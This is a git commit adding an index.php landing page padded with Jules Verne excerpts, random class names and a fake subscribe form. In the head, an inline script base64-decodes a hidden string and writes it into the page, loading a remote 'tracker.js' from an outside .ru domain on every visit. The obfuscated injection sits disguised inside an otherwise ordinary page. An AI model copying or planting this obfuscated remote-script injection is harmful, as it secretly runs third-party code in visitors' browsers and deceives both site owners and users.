27a8bde9f0b8bf9fb6c6885189fe52d200e2b520
kmbrsolj <77456826+kmbrsolj@users.noreply.github.com>
2021-01-14 19:30:23 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>To the N.E. two volcanic islands emerged, of unequal size, surrounded b</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9kNXdoNG1xc20xdWlrbTduZnAiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="efd8rkl6i7cd0y4s2d8">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="4n9lfhpmh9jj7g6w">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>To the N.E. two volcanic islands emerged, of unequal size, surrounded b</h1>
+	</section>
+
+
+	<section class="our-work" class="ej747ngngfa6vqjgbq27m">
+		<h3 class="title">Indeed the narwhal is armed with a sort of ivory sw</h3>
+		<p>But how could you construct this wonderful Nautilus in secret? You wished to see, friend Ned; well, you see now. Barren! he exclaimed, with animation. Do you think then, sir, that these riches are lost because I gather them? Is it for myself alone, according to your idea, that I take the trouble to collect these treasures? Who told you that I did not make a good use of it? Do you think I am ignorant that there are suffering beings and oppressed races on this earth, miserable creatures to console, victims to avenge? Do you not understand? Very well! No offense to master, he replied quietly; if this is not Bouguer's cuttle-fish, it is, at least, one of its brothers.</p>
+		<hr>
+
+		<ul class="grid" class="o5garh0rh6lv58bbwv">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="efd8rkl6i7cd0y4s2d8">
+		<h3 class="title">But an incident that will oblige you perha</h3>
+		<p>Twelve thousand, M. Aronnax. These are the only ties which bind me to the earth. But I had done with the world on the day when my Nautilus plunged for the first time beneath the waters. That day I bought my last volumes, my last pamphlets, my last papers, and from that time I wish to think that men no longer think or write. These books, professor, are at your service besides, and you can make use of them freely. The sea was distinctly visible for a mile all round the Nautilus. What a spectacle! What pen can describe it? Who could paint the effects of the light through those transparent sheets of water, and the softness of the successive gradations from the lower to the superior strata of the ocean? The equator was crossed. Twenty miles to the west were the Guianas, a French territory, on which we could have found an easy refuge; but a stiff breeze was blowing, and the furious waves would not have allowed a single boat to face them. Ned Land understood that, no doubt, for he spoke not a word about it. For my part, I made no allusion to his schemes of flight, for I would not urge him to make an attempt that must inevitably fail. I made the time pass pleasantly by interesting studies. During the days of April 11th and 12th the Nautilus did not leave the surface of the sea, and the net brought in a marvelous haul of zoophytes, fish, and reptiles. Some zoophytes had been fished up by the chain of the nets; they were for the most part beautiful phyctallines, belonging to the actinidian family, and among other species the phyctalis protexta, peculiar to that part of the ocean, with a little cylindrical trunk, ornamented with vertical lines, speckled with red dots, crowning a marvelous blossoming of tentacles. As to the mollusks, they consisted of some I had already observed-turritellas, olive porphyras, with regular lines intercrossed, with red spots standing out plainly against the flesh; odd peteroceras, like petrified scorpions; translucid hyaleas, argonauts, cuttle-fish (excellent eating), and certain species of calmars that naturalists of antiquity have classed among the flying-fish, and that serve principally for bait for cod fishing. I had not an opportunity of studying several species of fish on these shores. Among the cartilaginous ones, petromyzons-pricka, a sort of eel, fifteen inches long, with a greenish head, violet fins, gray-blue back, brown belly, silvered and sown with bright spots, the pupil of the eye encircled with gold-a curious animal that the current of the Amazon had drawn to the sea, for they inhabit fresh waters-tuberculated streaks, with pointed snouts, and a long loose tail, armed with a long jagged sting; little sharks, a yard long, gray and whitish skin, and several rows of teeth, bent back, that are generally known by the name of pantouffles; vespertilios, a kind of red isosceles triangle, half a yard long, to which pectorals are attached by fleshy prolongations that make them look like bats, but that their horny appendage, situated near the nostrils, has given them the name of sea-unicorns; lastly, some species of balist?, the curassavian, whose spots were of a brilliant gold color, and the capriscus of clear violet, and with varying shades like a pigeon's throat. I have noticed it, captain, I replied; and if it gets much hotter we cannot bear it.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="4n9lfhpmh9jj7g6w" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="o5garh0rh6lv58bbwv" class="title">A general cry arose from the frigate.</h3>	
+		<p>Arrived at the robing-room, I saw that neither of my companions nor any of the ship's crew were to follow us on this excursion. Captain Nemo had not even proposed my taking with me either Ned or Conseil. Perfectly, Captain Nemo; but the air that you carry with you must soon be used; when it only contains fifteen per cent. of oxygen, it is no longer fit to breathe. But, said I, it is not a question of fishing for them with an iron swivel, hoisting them into the vessel, cutting off their tails with a blow of the chopper, ripping them up, and throwing their hearts into the sea! In any case, replied the Canadian, we shall be free, for we are floating.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="efd8rkl6i7cd0y4s2d8">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="4n9lfhpmh9jj7g6w"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="ej747ngngfa6vqjgbq27m"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="o5garh0rh6lv58bbwv"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>023 Rohan Viaduct, Apt. 602, 62540, Wolfborough, Illinois, United States</p>
+	</footer>
+
+</body>
+
+</html>
